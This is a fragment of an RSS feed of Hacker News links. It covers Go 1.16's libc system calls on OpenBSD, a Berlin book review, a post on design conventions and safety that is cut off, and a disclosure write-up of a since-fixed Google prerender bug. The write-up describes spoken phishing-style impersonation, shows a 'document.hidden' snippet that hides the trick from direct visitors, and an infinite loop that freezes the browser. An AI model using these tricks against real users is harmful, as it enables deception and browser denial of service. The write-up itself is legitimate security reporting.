            <guid isPermaLink="false">hacker-news-small-sites-25998154</guid>
            <pubDate>Tue, 02 Feb 2021 07:13:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Go 1.16 will make system calls through Libc on OpenBSD]]>
            </title>
            <description>
<![CDATA[
Score 291 | Comments 172 (<a href="https://news.ycombinator.com/item?id=25997506">thread link</a>) | @lladnar
<br/>
February 1, 2021 | https://utcc.utoronto.ca/~cks/space/blog/programming/Go116OpenBSDUsesLibc | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/programming/Go116OpenBSDUsesLibc">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Go 1.16 will make system calls through libc on OpenBSD</h2>

	<p><small>February  1, 2021</small></p>
</div><div><p>One of the unusual things about <a href="https://golang.org/">Go</a> is that
it started out with the approach of directly making system calls
on Unix, instead of calling the standard C library functions that
correspond to those system calls. <a href="https://utcc.utoronto.ca/~cks/space/blog/programming/GoCLibraryAPIIssues">There are reasonably good reasons
for Go to make direct system calls</a> and this
works well on Linux, but other Unixes are different. The official
API for Illumos and Solaris system calls requires you to use their
C library, and OpenBSD wants you to do this as well for security
reasons (for <a href="https://lwn.net/Articles/806776/">OpenBSD system call origin verification</a>). Go has used the C library on
Solaris and Illumos for a long time, but through Go 1.15 it made
direct system calls on OpenBSD and so current released versions of
OpenBSD had a special exemption from their system call origin
verification because of it.</p>

<p>The news of the time interval for Go 1.16 is that this is changing. To
quote from the current draft release notes (which are probably soon to
be the official release notes):</p>

<blockquote><p>On the 64-bit x86 and 64-bit ARM architectures on OpenBSD (the
<code>openbsd/amd64</code> and <code>openbsd/arm64</code> ports), system calls are now
made through <code>libc</code>, instead of directly using the <code>SYSCALL/SVC</code>
instruction. This ensures forward-compatibility with future versions
of OpenBSD. In particular, OpenBSD 6.9 onwards will require system
calls to be made through <code>libc</code> for non-static Go binaries.</p>
</blockquote>

<p>As far as I know, Go programs that look up host names or do a few other
operations are very likely to not be statically linked. You can force
static linking (and you'll normally get it if you cross-build), but it
has some drawbacks for hostname lookups in some configurations and you
can't do some other operations at all.</p>

<p>At one level everything is okay with this situation. OpenBSD 6.9 will
almost certainly include Go 1.16 in its ports collection, since it will
be the only version of Go that works on it, and from there you can build
Go programs that will run fine on 6.9. At another level, any dynamically
linked Go program you have will need to be rebuilt with Go 1.16 before
you can run it on OpenBSD 6.9. Hopefully you have the source code and
can still build it (in what will be a 'modular by default' world in Go
1.16). This is nothing really new for OpenBSD, which has always made it
clear that they don't promise ABI or even API compatibility; you always
need to be prepared to rebuild your programs for new OpenBSD versions,
and perhaps to update them to more secure APIs.</p>

<p>(Statically linked Go programs built by Go 1.15 or earlier will likely
keep working on OpenBSD 6.9, assuming that there are no other ABI
changes that affect them. But you should probably plan to rebuild them
with Go 1.16 just to be sure. I don't know what the situation will be
if you want to create Go binaries that work across a range of OpenBSD
versions.)</p>

<p>As the release notes say, Go 1.16 will make system calls through libc
for all programs, whether they're dynamically linked or statically
linked. Right now OpenBSD only requires this for dynamically linked
programs (well, will require it), but always calling via libc is simpler
than to maintain two sets of system call code. And someday OpenBSD may
do something more elaborate so that making system calls via libc is
required even for statically linked programs.</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/programming/Go116OpenBSDUsesLibc</link>
            <guid isPermaLink="false">hacker-news-small-sites-25997506</guid>
            <pubDate>Tue, 02 Feb 2021 04:39:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Surprising Security Vulnerability on the Google Search Results Page]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25996667">thread link</a>) | @patelajay285
<br/>
February 1, 2021 | https://ajayp.app/posts/2021/01/a-surprising-security-vulnerability-on-the-google-search-results-page/ | <a href="https://web.archive.org/web/*/https://ajayp.app/posts/2021/01/a-surprising-security-vulnerability-on-the-google-search-results-page/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Back in 2015, I discovered a surprising security vulnerability that allowed you to run malicious JavaScript code on the Google search engine results page, which might be one of the most secure pages on the internet given how much daily traffic it recieves. It wasn’t until <a href="#the-fix">4 years later (or 2019) that they finally closed the case on it</a> and I could share it without breaking my nondisclosure agreement with Google.</p><p>This sounds like a lot like an <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">XSS attack</a>, which you would imagine Google would sanitize for, but it’s not and it’ll soon become clear why as I explain.</p><p>I was on Google searching for something like <em>“text-to-speech javascript libraries”</em>. I went from the Google search results page to clicking the first result, back to the Google search results page, to clicking on the second result, back to the Google search results page, etc. What I noticed was that my speakers kept making a clicking noise, like they were turning on and off—but just for a second.</p><figure><img src="https://media.ajayp.app/posts/2021/01/google-search.png" loading="lazy" width="340"></figure><p>I thought maybe there was some other program running on my computer or that my speakers were busted, but I realized it happened everytime I went to the Google search results page for this query. It also happened everytime I went to the first search results page, which was of a company that had a demo of their text-to-speech solution on it.</p><p>I figured the company’s page was loading their text-to-speech engine, that seemed to use the <a href="https://developer.mozilla.org/en-US/docs/Web/API/SpeechSynthesis">SpeechSynthesis interface of the WebSpeech API</a>, and that’s why the speakers were turning on. But why were they on the Google page? That seemed like Google was maybe pulling in code on the search results page from the company’s page. That should never happen though, surely Google sanitizes anything that ever gets displayed on their pages from containing HTML or <code>&lt;script&gt;</code> tags.</p><p>This seemed like a plausible attack vector if there was some bug that allowed you to bring arbitrary code on to the Google search results page and a huge one at that.</p><p>I dumped the source code of the search results page and started looking at the HTML around the search result, but it didn’t look like any <code>&lt;script&gt;</code> or HTML tags were making it through. I started looking for instances of the company’s domain and found something like:</p><div><pre><code data-lang="html">&lt;<span>link</span> <span>rel</span><span>=</span><span>"prerender"</span> <span>href</span><span>=</span><span>"https://thecompanyspage.com/example"</span>&gt;
</code></pre></div><p>I was not familiar with <code>rel="prerender"</code> myself in 2015. Indeed, it seemed to be some sort of <a href="https://www.w3.org/TR/2015/WD-resource-hints-20150717/#dfn-prerender">new mechanism for pre-fetching and pre-loading a page</a> to speed up page transistions and load times as an optimization.</p><p>Google seemed to have invented <code>rel="prerender"</code> to prefetch and load the first search result in the background, so that when you clicked on the first search result (as most users do), it would instantly be ready for viewing.</p><p>The <code>rel="prerender"</code> has to execute JavaScript to load dynamic content, but it wasn’t blocking the WebSpeech API from playing audio possibly. Luckily for Google, the pre-rendered content is loaded in its own origin and, therefore, sensitive resources like cookies on the Google page were not at risk from being harvested by attackers like they would be in an XSS attack.</p><p>After learning this, the next step was to prove this out with my own website on Google’s search results page and see what I could make of it.</p><p>I needed a long obscure phrase that I could get the #1 Google search result spot for and that no one would accidently stumble upon so I could keep the vulnerability relatively secret until Google could fix it. I chose the apt phrase “Alphabet Spoke to Me In My Dreams” and purchased the <code>alphabetspoketomeinmydreams.xyz</code> domain name (now expired) that would show up as the first Google search result for the phrase. This was around the time <a href="https://www.nytimes.com/2015/08/11/technology/google-alphabet-restructuring.html">Google restructured into Alphabet Inc</a>.</p><p>The first malicious thing I could think to do was to “vandalize” the Google search results page with one of those “win a prize” scams pretending to be Google to phish their users. I also thought it would be sufficiently creepy to show how you were able to access standard information about the user like their location, ISP, IP address while being prerendered and speak it back to them. I know <a target="_blank" href="https://youtu.be/iZ6bamP8wZk?t=46">Dwight Schrute would be scared of that</a>.</p><figure><div><p><iframe width="560" height="315" src="https://www.youtube.com/embed/1bFlquq0GcY" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></div><figcaption><span>Google Search Results Page Proof-of-Concept</span>
JavaScript code executing to play speech synthesis audio on the Google search results page.</figcaption></figure><p>So this looks pretty bad, but you would think that a user might notice if they click on the first result that it was a 3rd-party page causing the audio to play not Google right? Yes, except you can use the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/hidden"><code>document.hidden</code> property</a> to detect prerender mode and condition your code so that it only runs in <code>rel="prerender"</code> mode on the Google search engine results page! This creates a pretty robust appearance for impersonation as nothing happens if you go to the page directly.</p><div><pre><code data-lang="javascript"><span>if</span> (<span>document</span>.hidden) {
  <span>// The page is being loaded in rel="prerender", run the WebSpeech API code
</span><span></span>} <span>else</span> {
  <span>// The page is being loaded normally, don't do anything
</span><span></span>}
</code></pre></div><h2 id="chrome-vulnerability">Chrome Vulnerability</h2><p>While testing this, I found that this doesn’t only work on the Google search results page, but it turns out Chrome also “prerenders” the first result of the autocomplete in the URL search bar. Therefore, you can start playing WebSpeech audio without even having a page loaded in the browser frame.</p><figure><div><p><iframe width="560" height="315" src="https://www.youtube.com/embed/pqyOnzGDRlg" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></div><figcaption><span>Google Chrome Proof-of-Concept</span>
JavaScript code executing to play speech synthesis audio in the Chrome browser before any page is loaded in the browser at all when triggered by a user typing in a search into the URL search bar.</figcaption></figure><h2 id="denial-of-service-possibilities">Denial-of-Service Possibilities</h2><p>After testing other APIs, it seemed clear that only the WebSpeech API was making it through to the parent page. Things like <code>alert()</code> boxes were deferred from being visible until the page was actually loaded. But it also seemed clear that, while certain APIs were not available, JavaScript was running unrestricted. What happens if you do an infinite loop on the prerendered page?</p><div><pre><code data-lang="javascript"><span>while</span> (<span>true</span>) {
  <span>// Infinite loop
</span><span></span>}
</code></pre></div><p>Yep, you could “denial of service” the Google search results page from being displayed. This is not an attack on their servers, but rather you lock up the user’s browser so Google’s search results page cannot load.</p><figure><img src="https://media.ajayp.app/posts/2021/01/dos.png" loading="lazy" alt="Google Search Results Page Denial-of-Service" title="Google Search Results Page Denial-of-Service" width="600"><figcaption><span>Google Search Results Page Denial-of-Service</span>
Preventing the Google search results page from even loading by infinite looping in the prerendered page.</figcaption></figure><p>I shared the live example and a locally reproducible example of the vulnerability to Google.</p><h2 id="googles-response">Google’s Response</h2><p>Google’s security team responded promptly and professionally within 24 hours and decided to award a monetary reward for the vulnerability. The Chrome team did not dual-award since Google had already awarded. The Chrome team, however, were responsible for fixing the issue. I was not able to share this bug for quite some time due to the nondisclosure terms of Google’s vulnerability program.</p><h2 id="the-fix">The Fix</h2><p>The bug report and discussion is now public and visible <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=520275">here</a>.</p><p>I was suprised at how long it took to resolve and how difficult the fix seemed to be. It proved very difficult to break this API out from being enabled in the prerender context. In fact, at one point, one of the developers mentioned: <em>“This is currently our oldest &gt;= Medium severity security bug."</em> It was not until 2019 that they finally closed the bug after prerendering support was completely dropped from Chrome, due to it causing headaches like this, and the proof-of-concept could no longer be reproduced.</p><p>So, it seems premature optimization like <code>rel="prerender"</code> being the root of all evil isn’t just true because you might spend time <a href="https://xkcd.com/1691/">optimizing something that isn’t worth it</a>, but also because it likely increases the complexity and surface area for serious security bugs.</p></div></div>]]>
            </description>
            <link>https://ajayp.app/posts/2021/01/a-surprising-security-vulnerability-on-the-google-search-results-page/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25996667</guid>
            <pubDate>Tue, 02 Feb 2021 02:00:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unfinished Metropolis: once and future Berlin (2020)]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25996656">thread link</a>) | @benbreen
<br/>
February 1, 2021 | https://www.degradedorbit.com/articles/unfinished-metropolis-once-and-future-berlin | <a href="https://web.archive.org/web/*/https://www.degradedorbit.com/articles/unfinished-metropolis-once-and-future-berlin">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="canvas">

    
    

    

    

    <!-- // page image or divider -->
    
      
        
      
    

    <section id="page" role="main" data-content-field="main-content" data-collection-id="5b7c34c2575d1f429a26358f" data-edit-main-image="Banner">

      <!-- // CATEGORY NAV -->
      

      <div>



  <article id="article-5f971be7bd69686acb65cf50" data-item-id="5f971be7bd69686acb65cf50">

    <!--POST HEADER-->

    <header>
  		
      
    </header>

    <!--SPECIAL CONTENT-->

    
      
    

    <!--POST BODY-->

    <div><div data-layout-label="Post Body" data-type="item" data-updated-on="1603739264296" id="item-5f971be7bd69686acb65cf50"><div><div><div data-block-type="2" id="block-95e54367cabc56f751eb"><div><p><strong><em>Unfinished Metropolis</em></strong><em><br></em><a href="https://dom-publishers.com/collections/monographs/products/unfinished-metropolis" target="_blank"><strong>DOM Publishers</strong></a><br>750pp, 2 volumes in slipcase, € 48.00</p><p><strong>THE GENESIS OF</strong> Berlin as we know it today happened just over a century ago, when, on October 1, 1920, the modern city of Greater Berlin (“Groß-Berlin”) was formed from eight adjacent cities and dozens of outlying districts. The formation of this new super-city doubled Berlin’s population from 1.9 million to what was, at the time, a staggering 3.9 million people, making it the world’s fifth-largest city after Tokyo.</p><p>While it is far from unusual to see major world cities expand and contract over time, as well as for the major cities of past eras to be overtaken by the new megacities of Asia, Africa, and South America, it is practically unheard of for a city on the scale of Berlin to be smaller in 2020 than it was 100 years before. The catastrophic destruction of WWII and the Battle of Berlin, which caused the population to plummet back to nearly its pre-Groß-Berlin level, also brought about the conditions that would keep the population low well into the following century. The crushing geopolitical gravity generated by Berlin’s position at the heart of the Cold War acted as a colossal reduction gear, stifling growth in both the Western and Eastern sectors of the city as each side threw all available resources into countering the advances of the other.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1603726593778_131865"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/56911f0d0ab377deeecbd785/1604320816015-FQFMQKKVLMHV5JPE9GYQ/ke17ZwdGBToddI8pDm48kJG14txsHgzjB7nppdaw8plZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpwu0TqNuiaV5_GOW_VJjc9kxccpf3lnWHr2NP-nONA3GVqI9aFR2ZcSR0-pFiy2cfQ/9783869222493_innenansicht_04_1024x1024.jpg" data-image="https://images.squarespace-cdn.com/content/v1/56911f0d0ab377deeecbd785/1604320816015-FQFMQKKVLMHV5JPE9GYQ/ke17ZwdGBToddI8pDm48kJG14txsHgzjB7nppdaw8plZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpwu0TqNuiaV5_GOW_VJjc9kxccpf3lnWHr2NP-nONA3GVqI9aFR2ZcSR0-pFiy2cfQ/9783869222493_innenansicht_04_1024x1024.jpg" data-image-dimensions="747x515" data-image-focal-point="0.5,0.5" alt="9783869222493_innenansicht_04_1024x1024.jpg" data-load="false" data-image-id="5f9ffe2f41d2a92c7a015277" data-type="image" src="https://www.degradedorbit.com/articles/9783869222493_innenansicht_04_1024x1024.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604309519192_38189"><div><p>From our current viewpoint&nbsp; two decades into the 21st century and three into a reunified Germany, Greater Berlin’s first century appears as a repeating cycle of destruction and renewal. This cyclical progression informs both the subject matter and the overarching structure of <strong><em>Unfinished Metropolis</em></strong>, a monumental new 2-volume work from Berlin’s Dom Publishers. The book accompanies the exhibition of the same name (“Unvollendete Metropole”; info at end of article), and takes a many-faceted view of Berlin, starting with an examination of the newly-unified Groß-Berlin, a unification that only happened, unsurprisingly (and much like the BER Airport debacle of the 21st century) after decades of conflict and barely-there consensus. As the introduction points out, Greater Berlin has spent the majority of its existence outside of democratic rule:</p><p><em>Greater Berlin was not ruled by democratically elected governments for many years of its history. It was only governed democratically in the period from 1920 to 1933 and then again more recently since 1990. The Greater Berlin project has suffered many setbacks. The city is an incomplete project.</em></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1603726593778_145993"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/56911f0d0ab377deeecbd785/1604320881705-FXBQOP4YZQD6NUP8B34Z/ke17ZwdGBToddI8pDm48kLmtpSGpfTWRR3a7ID72iKlZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PId1dPce1hbL_xovi9-_ZRgZkcCx6byhA5r5lUBWSe_W4KMshLAGzx4R3EDFOm1kBS/9783869222493_innenansicht_06_1024x1024.jpg" data-image="https://images.squarespace-cdn.com/content/v1/56911f0d0ab377deeecbd785/1604320881705-FXBQOP4YZQD6NUP8B34Z/ke17ZwdGBToddI8pDm48kLmtpSGpfTWRR3a7ID72iKlZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PId1dPce1hbL_xovi9-_ZRgZkcCx6byhA5r5lUBWSe_W4KMshLAGzx4R3EDFOm1kBS/9783869222493_innenansicht_06_1024x1024.jpg" data-image-dimensions="984x570" data-image-focal-point="0.5,0.5" alt="9783869222493_innenansicht_06_1024x1024.jpg" data-load="false" data-image-id="5f9ffe7073e1561a65f75106" data-type="image" src="https://www.degradedorbit.com/articles/9783869222493_innenansicht_06_1024x1024.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604268871222_13256"><p>The rest of the book takes this idea to heart, and views Berlin through numerous lenses of <em>becoming</em>, rather than of <em>being. </em>Its perspective zooms out, for example, for dictator’s-eye view of the Nazi fantasia of Germania and the massive Socialist project Stalinallee. In a remarkable cartoon that compresses the curvature of the earth from Rome through Dresden and Berlin and beyond, reminiscent of Saul Steinberg’s “View of the World from 9th Avenue”, it even cast the Axis of WWII phantasmagorically onto the curvature of the earth. More frequently, though, its perspective zooms <em>in</em> on a staggering array of Berlin neighborhoods and city centers (Berlin’s paradoxical nature as a city with numerous “centers” is a recurring theme in the book), from lasting “centers” like Alexanderplatz and Zoologischer Garten to outlying districts like Friedenau in the West and Marzahn in the East, as well as yet more microscopic examinations of plazas, parks, and even specific artworks.</p></div><div data-block-type="5" id="block-yui_3_17_2_1_1603726593778_154562"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/56911f0d0ab377deeecbd785/1604320920366-J8O3AC6S80MEPZ7QIN3Y/ke17ZwdGBToddI8pDm48kKMvhmW4XDVUvRNeVjTih8AUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcd2YDz7CbvKCMbhI-eX1RxOvukNcWl0sYLLJkXo0Z3h0ciZVMsGk1jiC50VUmjlSD/9783869222493_innenansicht_17_1024x1024.jpg" data-image="https://images.squarespace-cdn.com/content/v1/56911f0d0ab377deeecbd785/1604320920366-J8O3AC6S80MEPZ7QIN3Y/ke17ZwdGBToddI8pDm48kKMvhmW4XDVUvRNeVjTih8AUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcd2YDz7CbvKCMbhI-eX1RxOvukNcWl0sYLLJkXo0Z3h0ciZVMsGk1jiC50VUmjlSD/9783869222493_innenansicht_17_1024x1024.jpg" data-image-dimensions="1022x577" data-image-focal-point="0.5,0.5" alt="9783869222493_innenansicht_17_1024x1024.jpg" data-load="false" data-image-id="5f9ffe9731ce363ec2d96c55" data-type="image" src="https://www.degradedorbit.com/articles/9783869222493_innenansicht_17_1024x1024.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604268871222_13674"><div><p>Unsurprisingly, maps are fundamental to the book, which features countless versions of the mapped city: street maps, transit maps, agricultural maps, Cold War maps from both East and West, comical maps by political cartoonists, utopian maps from the 1960s and 1970s, maps of neighborhoods long destroyed by war and property speculation, maps of futures that never came to pass. While such a vast array of maps might seem overwhelming, their overall effect is, paradoxically, one of greater focus. The accumulation of so many varied views of the city leads to a surprisingly unified view of the whole, like a cubist painting or a musical composition with a repeating theme. Berlin has spent the past century proving itself to be one of the world’s most unmappable cities (from a conventional perspective), with monumental buildings constructed and razed to the ground within decades – and, in the case of the Stadtschloß, built up again. The city has seen whole neighborhoods built, destroyed, and rebuilt, streets changing names from decade to decade, and of course its 30-year stint as two divided cities.&nbsp;</p><blockquote><h3><em>The accumulation of so many varied views of the city leads to a surprisingly unified view of the whole, like a cubist painting or a musical composition with a repeating theme</em></h3></blockquote><p>True to its cyclical take on Berlin’s history, the book favors a thematic progression over a chronological one, moving backwards and forwards in history, from the 1920s (and even earlier) right up to bleeding-edge current events like COVID-19, the new BER Airport, and the still-under-construction Tesla Gigafactory. While current mayor Michael Müller provides an introductory text, the true “host” of the book is <strong>Gustav Böß</strong>, mayor of Greater Berlin from 1921 to 1929. Böß possesses not only a far-reaching futurism – “Urban development should never be driven by current needs, but rather by how it will meet future needs” – but also a timeless weariness appropriate to anyone who has attempted to obtain a consensus in the cranky, contentious politics of Berlin. His words written in the 1920s resonate prophetically over the next century’s worth of maps, documents, and photographs, and introduce each major new thematic section, from Berlin’s rail network to its roads and streets to the issue of its numerous “centers”.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1603726593778_150290"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/56911f0d0ab377deeecbd785/1604321034824-T90IAJ1SL0Y8R11AKPHQ/ke17ZwdGBToddI8pDm48kPf-9IFiXHlN5wUHqhl69w4UqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcOXFSvWCyvgJTrEeQb128qZmUj8S1UqnZWcPfld7eae8dRUyPxgfIWWzZJ3F5ed1Y/9783869222493_innenansicht_9_1024x1024.jpg" data-image="https://images.squarespace-cdn.com/content/v1/56911f0d0ab377deeecbd785/1604321034824-T90IAJ1SL0Y8R11AKPHQ/ke17ZwdGBToddI8pDm48kPf-9IFiXHlN5wUHqhl69w4UqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcOXFSvWCyvgJTrEeQb128qZmUj8S1UqnZWcPfld7eae8dRUyPxgfIWWzZJ3F5ed1Y/9783869222493_innenansicht_9_1024x1024.jpg" data-image-dimensions="1022x571" data-image-focal-point="0.5,0.5" alt="9783869222493_innenansicht_9_1024x1024.jpg" data-load="false" data-image-id="5f9fff09501b164da3d2e69a" data-type="image" src="https://www.degradedorbit.com/articles/9783869222493_innenansicht_9_1024x1024.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603726593778_154122"><p>Fittingly, for a project so open to moving forward and backward in time, the second volume sets its eyes on the next half-century. This companion volume documents the “International Urban Planning Competition for Berlin-Brandenburg 2070”, where competitors sought to present comprehensive visions for the next 50 years. The competition, as well as Volume Two itself, take an international view of city planning, looking abroad to other European capitals from London to Paris to Moscow. The text offers ample historical context for each city covered, ultimately highlighting the ways in which Berlin’s challenges are either different from – or, more frequently, surprisingly similar to – those of other cities.</p></div><div data-block-type="5" id="block-yui_3_17_2_1_1603726593778_141204"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/56911f0d0ab377deeecbd785/1603738806470-1G6RZB8TWWCFG26BSAUT/ke17ZwdGBToddI8pDm48kMkblXQQFbdNlTnVTtJ-j2sUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcyQHbZDoZOEFGy2lUoL7MEoudnTLDJTBZlw1qylfth9wtQRRgu06LHCr8P_KT66ke/9783869222493_innenansicht_22_1024x1024.jpg" data-image="https://images.squarespace-cdn.com/content/v1/56911f0d0ab377deeecbd785/1603738806470-1G6RZB8TWWCFG26BSAUT/ke17ZwdGBToddI8pDm48kMkblXQQFbdNlTnVTtJ-j2sUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcyQHbZDoZOEFGy2lUoL7MEoudnTLDJTBZlw1qylfth9wtQRRgu06LHCr8P_KT66ke/9783869222493_innenansicht_22_1024x1024.jpg" data-image-dimensions="1023x637" data-image-focal-point="0.5,0.5" alt="9783869222493_innenansicht_22_1024x1024.jpg" data-load="false" data-image-id="5f971cb6fcd1705a9b248425" data-type="image" src="https://www.degradedorbit.com/articles/9783869222493_innenansicht_22_1024x1024.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603726593778_159263"><div><p><em>Unfinished Metropolis</em> provides many useful lenses through which Berlin’s often haphazard, unfinished, and imperfect urban systems can be viewed. Its willingness to travel quickly between past and future makes for a highly readable text, which nonetheless remains grounded in reality. Most importantly, it shows Berlin’s resilience in outliving adversity. The shadows of a global pandemic and an imperiled EU may still be looming, but Berlin has seen more than its share of challenges over the past century, none of which have broken its capacity for self-reinvention.</p><p><em>The exhibition “Unvollendete Metropole: 100 Jahre Städtebau für Groß-Berlin” runs at </em><a href="https://www.visitberlin.de/de/event/unvollendete-metropole-100-jahre-staedtebau-fuer-gross-berlin" target="_blank"><strong><em>Kronprinzenpalais</em></strong></a><em> through January 3, 2021. Current COVID-19 restrictions may affect access and opening hours.</em></p></div></div></div></div></div></div>
    


    <!--POST FOOTER-->

    


  </article>



<!--PAGINATION-->


  



  <!-- COMMENTS -->

  


</div><!-- /article-wrapper -->



    </section>

    

    <!-- <div class="page-divider bottom-divider"></div> -->

    

    

  </div></div>]]>
            </description>
            <link>https://www.degradedorbit.com/articles/unfinished-metropolis-once-and-future-berlin</link>
            <guid isPermaLink="false">hacker-news-small-sites-25996656</guid>
            <pubDate>Tue, 02 Feb 2021 01:58:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Conventions of Safety (2019)]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25995786">thread link</a>) | @luu
<br/>
February 1, 2021 | https://ceri.storey.name/posts/2019-08-18-unconventional-safety.html | <a href="https://web.archive.org/web/*/https://ceri.storey.name/posts/2019-08-18-unconventional-safety.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>Thanks to some discussions in my team recently, I’ve been thinking recently about how design conventions can help or harm safety.<!--more--> One place this comes up is in application layout, and what kinds of behaviour we put where.</p>
<p>To my mind, the biggest value in having conventions around service layout is to lower the cost of change. Let’s say we have a component that listens for events from others. In that case, you might have a habit of putting those listeners into a file named <code>listener.rs</code>. If this becomes a habit, you will know to look at the listener file, instead of needing to search for it.</p>
<p>When we write a service then change it rarely afterwards, this habit can be very useful. If you are unfamiliar with a section of the codebase, these kinds of <em>affordances</em> can make life easier. This results in less time sifting through code, and so makes it easier to change.</p>
<p>Another way to lower the cost of change is to have clear roles for each module within it. (And these roles themselves can follow clear patterns). Even then, these roles serve to hide some detail from the rest of the system.</p>
<p>A good interface means that a caller can express intent clearly, and let someone else worry about the details. For example, a database library lets you can pose <em>queries</em> and get results back. Without it, you’d need to know exactly how to turn your application’s data into something the database understands, and vica versa.</p>
<p>A good interface should also make clear what it needs. Let’s say some people in an office want to number documents. We can keep a logbook with the last number used. We can read the previous value we gave out, write down the next number, and use that for our document.</p>
<p>If lots of people want to number documents at the same time, then we encounter a problem. What if two people read then write the same numbers, and have the same number for their documents? People shouldn’t make this mistake, as they’ll notice that someone else is holding the book, and won’t race to write in it before the other has finished. Some people describe this as “common sense”.</p>
<p>Computers don’t have common sense. This is why we need to spell everything out to them in exacting detail. If they have read the last document number, they won’t know to check no-one else has changed it when they write down the new number, either.</p>
<p>So, in a distributed system we can use a centralised lock service to solve this problem. With this, the computer will take the lock, update the number and release the lock. Even then, if the new number routine does not know anything about the lock mechanism, it’s still possible to make the same mistake. A programmer might forget that they need to take the lock to call the new number routine, for example.</p>
<p>So, we have ways to solve this. One is we make the new number routine manage the lock itself. This is fine as long as it controls everything itself, but once we have other routines that use locks involved, then things get more complicated. This is okay if the lock for the new number is only for that new number. But if we share it with other routines, we risk problems like deadlocks.</p>
<p>Another solution is to inform the new number routine that we hold the lock, and have the routine fail if we do not. For example, the lock server may provide a <a href="https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html">token</a> the routine can verify. .</p>
<p>The logical conclusion to this is in the rust standard library. The <code>Mutex&lt;T&gt;</code> type holds a value of some type T, and will only permit access via a guard that guarantees we hold the lock.</p>
<p>A big part of designing safe systems is understanding how things go right over the long term. A big part of this is to ensure that it’s easy to do the safe thing, and difficult to do something unsafe.</p>
<p>The example of numbering documents is quite a low stakes task. In a bank though, we need to number payment cards, so we know whose account to charge. Having two cards with the same card number may mean one person can spend another’s money. This is bad for the customer, and leaves the bank liable for the mistake.</p>
